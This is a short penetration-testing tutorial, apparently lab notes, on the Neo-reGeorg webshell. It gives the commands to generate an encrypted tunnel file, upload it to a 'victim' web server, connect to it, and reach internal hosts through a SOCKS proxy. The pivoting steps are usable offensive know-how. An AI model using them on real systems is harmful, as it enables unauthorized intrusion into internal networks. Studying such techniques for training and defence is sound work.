# Neo-reGeorg Webshell

* Neo-reGeorg is unlike other webshells where it will not yield you command execution on a host natively. However, if you are able to establish a neo-regeorg on a host in the first place you already have access to it.
* Neo-reGeorg allows you to compromise a web server (typically public facing) and to tunnel through it to other internal only hosts in the network. This is called HTTP Tunneling.

### HTTP Tunneling&#x20;

* For HTTP Tunneling, we will be using a [Neo-reGeorg](https://github.com/L-codes/Neo-reGeorg) tool to establish a communication channel to access the internal network devices.
* Generate an encrypted client file to upload it to the victim web server&#x20;

```
python3 neoreg.py generate -k my_key  
```

* `-k` is the key for the file so in the real world make it strong&#x20;
* The previous command generates encrypted Tunneling clients with `my_key` key in the `neoreg_servers/` directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc.
* We will be using `tunnel.php`
* Upload the `tunnel.php` file to the victim web server&#x20;
* Now let's connect to the neo from our attack machine that we just uploaded&#x20;

```
python3 neoreg.py -k my_key -u http://MACHINE_IP/uploader/files/tunnel.php
```

* Once you connect, we are ready to use the tunnel connection as a proxy on our local machine `127.0.0.1:1080`&#x20;
* Now we can tunnel further into the network&#x20;
* To curl with socks, run the below command

```
curl --socks5 127.0.0.1:1080 http://172.20.0.121:80
```
